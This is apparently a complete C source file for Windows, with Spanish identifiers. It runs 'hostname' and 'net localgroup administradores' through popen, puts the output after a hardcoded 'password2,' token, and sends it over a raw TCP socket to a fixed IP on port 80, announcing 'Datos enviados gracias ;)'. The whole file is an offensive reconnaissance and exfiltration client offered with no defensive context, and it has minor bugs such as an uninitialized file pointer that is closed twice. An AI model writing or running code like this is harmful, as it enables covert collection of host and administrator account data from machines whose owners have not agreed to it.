#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <string.h>


int ejecuta(char[], FILE *);
int cliente_socket(char *);

char comando [] = "hostname & net localgroup administradores";
char ip_server [] = "192.168.8.104";
int puerto_server = 80;

int main(){
    FILE * file_host;
    ejecuta(comando, file_host);
    pclose(file_host);
    return 0;
}

int cliente_socket(char * message){
    WSADATA wsa;
	SOCKET s;
	struct sockaddr_in server;

    if (WSAStartup(MAKEWORD(2,2),&wsa) != 0){
		printf("Error: %d",WSAGetLastError());
		return 1;
	}

    if((s = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET){
		printf("No es posible crear el socket: %d" , WSAGetLastError());
	}

    server.sin_addr.s_addr = inet_addr(ip_server);
	server.sin_family = AF_INET;
	server.sin_port = htons(puerto_server);

    if (connect(s, (struct sockaddr *)&server , sizeof(server)) < 0){
		puts("Error de conexion");
		return 1;
	}
    puts("Conectado");

    if( send(s, message, strlen(message), 0) < 0)
	{
		puts("Error en envio");
		return 1;
	}
	puts("Datos enviados gracias ;)");

    return 0;
}

int ejecuta(char comando [], FILE * fp){
    //FILE *fp;
    char output[1024];
    char temp[1024] = "password2,"; //TODO: Obtener de var amb, u otro medio.
    fp = popen(comando, "r");

    if(fp==NULL){ 
        perror("popen"); 
        exit(EXIT_FAILURE);
    }

    while(fgets(output, 1023, fp) != NULL){
        //printf("%s",output);
        strcat(temp,output);
    }
    strcat(temp, "\nEOF\n");
    char * mensaje = temp;
    cliente_socket(mensaje);
    pclose(fp);
    return 0;
}
